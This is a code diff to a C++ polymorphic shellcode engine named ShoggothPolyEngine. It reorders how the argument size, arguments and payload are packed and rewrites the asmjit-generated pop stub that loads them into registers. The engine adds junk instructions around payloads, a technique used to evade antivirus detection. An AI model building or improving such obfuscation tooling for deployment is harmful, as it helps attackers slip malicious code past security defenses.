@@ -122,8 +122,8 @@ PBYTE ShoggothPolyEngine::AddCOFFLoader(PBYTE payload, int payloadSize, PBYTE ar
     }
 
     if (arguments) {
-        // Argument + argument size + payload
-        payloadAndArgument = MergeChunks(arguments, argumentSize, (PBYTE)&argumentSize, sizeof(int));
+        // Argument size + argument + payload
+        payloadAndArgument = MergeChunks((PBYTE)&argumentSize, sizeof(int), arguments, argumentSize);
         payloadAndArgumentSize = argumentSize + sizeof(int);
 
         newPayloadChunk = MergeChunks(payloadAndArgument, payloadAndArgumentSize, payload, payloadSize);
@@ -142,7 +142,7 @@ PBYTE ShoggothPolyEngine::AddCOFFLoader(PBYTE payload, int payloadSize, PBYTE ar
     this->asmjitRuntime.release(callStub);
     // VirtualFree(callStub, 0, MEM_RELEASE);
     // New payload size
-    payloadWithCallSize = payloadSize + callStubSize;
+    payloadWithCallSize = newPayloadChunkSize + callStubSize;
 
     // Since input PE address is in stack now, we can create a garbage and pop it.
     popStub = this->GenerateThreePopWithGarbage(x86::rcx, x86::rdx, x86::r8,argumentSize, popStubSize);
@@ -178,17 +178,34 @@ PBYTE ShoggothPolyEngine::GenerateThreePopWithGarbage(x86::Gp payloadReg, x86::G
 
     PBYTE garbageInstructions = this->GenerateRandomGarbage(garbageSize);
     // Argument + argument size + payload
-    asmjitAssembler->pop(argumentReg);
+    asmjitAssembler->pop(argumentSizeReg);
     if (argumentSize) {
-        asmjitAssembler->mov(argumentSizeReg, argumentReg);
-        asmjitAssembler->mov(payloadReg, argumentReg);
-        asmjitAssembler->add(argumentSizeReg, argumentSize);
-        asmjitAssembler->add(payloadReg, argumentSize + sizeof(int));
+        /*
+        *  Argument Size + Arguments + Payload
+            pop r8
+            push r9
+            mov r9,dword_ptr(r8)
+            add r8,4
+            mov rdx,r8
+            add r8,r9
+            mov rcx,r8
+            mov r8, r9
+            pop r9
+
+        */
+        asmjitAssembler->push(x86::r9);
+        asmjitAssembler->mov(x86::r9d, x86::dword_ptr(argumentSizeReg));
+        asmjitAssembler->add(argumentSizeReg, sizeof(int));
+        asmjitAssembler->mov(argumentReg, argumentSizeReg);
+        asmjitAssembler->add(argumentSizeReg, x86::r9);
+        asmjitAssembler->mov(payloadReg, argumentSizeReg);
+        asmjitAssembler->mov(argumentSizeReg, x86::r9);
+        asmjitAssembler->pop(x86::r9);
     }
     else {
-        asmjitAssembler->mov(payloadReg, argumentReg);
-        asmjitAssembler->xor_(argumentReg,argumentReg);
-        asmjitAssembler->xor_(argumentSizeReg,argumentSizeReg);
+        asmjitAssembler->mov(payloadReg, argumentSizeReg);
+        asmjitAssembler->xor_(argumentReg, argumentReg);
+        asmjitAssembler->xor_(argumentSizeReg, argumentSizeReg);
     }
     popPtr = this->AssembleCodeHolder(popSize);
     returnValue = MergeChunks(garbageInstructions, garbageSize, popPtr, popSize);
